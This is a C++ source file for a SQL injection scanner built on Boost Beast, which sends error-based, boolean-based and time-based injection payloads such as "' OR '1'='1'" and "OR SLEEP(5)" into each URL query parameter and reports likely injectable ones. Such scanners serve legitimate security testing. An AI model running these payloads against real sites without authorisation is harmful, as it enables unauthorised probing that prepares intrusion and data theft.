
#include "sqlinj.h"

#include <boost/url.hpp>
#include <boost/asio.hpp>
#include <boost/beast.hpp>
#include <boost/beast/ssl.hpp>

#include <chrono>
#include <iostream>
#include <regex>
#include <string>
#include <vector>

namespace beast = boost::beast;
namespace http  = beast::http;
namespace net   = boost::asio;
namespace urls  = boost::urls;
namespace ssl   = net::ssl;
using tcp       = net::ip::tcp;


static std::string sendRequest(const std::string& host,
                               const std::string& target,
                               const std::string& port,
                               bool               useSSL,
                               double&            durationSec)
{
    try {
        net::io_context ioc;
        ssl::context    ctx(ssl::context::sslv23_client);
        tcp::resolver   resolver(ioc);
        beast::flat_buffer buffer;

        auto const results = resolver.resolve(host, port);

        auto start = std::chrono::high_resolution_clock::now();

        /* HTTPS branch ----------------------------------------------------- */
        if (useSSL) {
            beast::ssl_stream<beast::tcp_stream> stream(ioc, ctx);

            if (!::SSL_set_tlsext_host_name(stream.native_handle(), host.c_str()))
                throw beast::system_error(
                    beast::error_code(static_cast<int>(::ERR_get_error()),
                                      net::error::get_ssl_category()));

            beast::get_lowest_layer(stream).connect(results);
            stream.handshake(ssl::stream_base::client);

            http::request<http::string_body> req{http::verb::get, target, 11};
            req.set(http::field::host, host);
            req.set(http::field::user_agent, BOOST_BEAST_VERSION_STRING);

            http::write(stream, req);

            http::response<http::string_body> res;
            http::read(stream, buffer, res);

            durationSec = std::chrono::duration<double>(
                              std::chrono::high_resolution_clock::now() - start)
                              .count();
            return res.body();
        }

        /* HTTP branch ------------------------------------------------------ */
        beast::tcp_stream stream(ioc);
        stream.connect(results);

        http::request<http::string_body> req{http::verb::get, target, 11};
        req.set(http::field::host, host);
        req.set(http::field::user_agent, BOOST_BEAST_VERSION_STRING);

        http::write(stream, req);

        http::response<http::string_body> res;
        http::read(stream, buffer, res);

        durationSec = std::chrono::duration<double>(
                          std::chrono::high_resolution_clock::now() - start)
                          .count();
        return res.body();
    }
    catch (std::exception const& ex) {
        std::cerr << "[!] Request error: " << ex.what() << '\n';
        durationSec = 0.0;
        return {};
    }
}


static bool containsSQLError(const std::string& response)
{
    static const std::vector<std::string> patterns = {
        "SQL syntax", "mysql_fetch", "ORA-01756", "SQLSTATE",
        "ODBC", "Warning.*mysql_", "Unclosed quotation mark",
        "quoted string not properly terminated"
    };

    for (auto const& pat : patterns)
        if (std::regex_search(response,
                              std::regex(pat,
                                         std::regex::icase | std::regex::ECMAScript)))
            return true;
    return false;
}


void scan_sqli(const std::string& urlStr)
{
    /* ---------- ❶ Parse the URL ---------- */
    auto parsed = urls::parse_uri(urlStr);
    if (!parsed) {
        std::cerr << "[!] Invalid URL: " << urlStr << '\n';
        return;
    }
    urls::url_view urlView = *parsed;
    std::cout << "[*] Scanning: " << urlView << '\n';

    /* Scheme / host / port -------------------------------------------------- */
    bool        useSSL = urlView.scheme() == "https";
    std::string host   = std::string(urlView.host());
    std::string port   = urlView.port().empty()
                         ? (useSSL ? "443" : "80")
                         : std::string(urlView.port());

    /* ---------- ❷ Collect parameter names ---------- */
    std::vector<std::string> paramKeys;
    for (auto const& p : urlView.params())
        paramKeys.emplace_back(std::string(p.key));

    if (paramKeys.empty()) {
        std::cout << "[!] No query parameters to fuzz.\n";
        return;
    }

    /* ---------- ❸ Payload dictionaries ---------- */
    const std::vector<std::string> error_payloads   = {"'", "\"", "`", "';", "\";"};
    const std::vector<std::pair<std::string, std::string>> boolean_payloads = {
        {"1",    "1 AND 1=2"},
        {"1",    "1 OR 1=1"},
        {"test", "test' OR '1'='1'"}
    };
    const std::vector<std::string> time_payloads = {
        "1 OR SLEEP(5)",
        "1; WAITFOR DELAY '0:0:5'"
    };

    /* ---------- ❹ Baseline request ---------- */
    double baselineTime = 0.0;
    (void)sendRequest(host,
                      std::string(urlView.encoded_target()),
                      port, useSSL, baselineTime);

    /* ---------- ❺ Fuzz each parameter ---------- */
    for (const std::string& key : paramKeys) {

        /* --- Error-based --------------------------------------------------- */
        for (const std::string& payload : error_payloads) {
            urls::url modified(urlView);
            auto      pr = modified.params();
            pr.set(key, payload);

            double      dur = 0.0;
            std::string res = sendRequest(host,
                                          std::string(modified.encoded_target()),
                                          port, useSSL, dur);

            if (containsSQLError(res)) {
                std::cout << "[+] Possible Error-based SQLi in \"" << key
                          << "\" using payload " << payload << '\n';
            }
        }

        /* --- Boolean-based ------------------------------------------------- */
        for (auto const& bp : boolean_payloads) {
            urls::url modTrue(urlView), modFalse(urlView);

            auto pT = modTrue.params();
            auto pF = modFalse.params();
            pT.set(key, bp.first);
            pF.set(key, bp.second);

            double durT = 0.0, durF = 0.0;
            std::string resT = sendRequest(host,
                                           std::string(modTrue.encoded_target()),
                                           port, useSSL, durT);
            std::string resF = sendRequest(host,
                                           std::string(modFalse.encoded_target()),
                                           port, useSSL, durF);

            if (resT.size() != resF.size()) {
                std::cout << "[+] Possible Boolean-based SQLi in \"" << key << "\"\n";
            }
        }

        /* --- Time-based ---------------------------------------------------- */
        for (const std::string& payload : time_payloads) {
            urls::url modified(urlView);
            auto      pr = modified.params();
            pr.set(key, payload);

            double dur = 0.0;
            (void)sendRequest(host,
                              std::string(modified.encoded_target()),
                              port, useSSL, dur);

            if (dur - baselineTime >= 4.0) {               // crude 4-second gap
                std::cout << "[+] Possible Time-based SQLi in \"" << key
                          << "\" (delay ≈ " << dur << " s)\n";
            }
        }
    }
}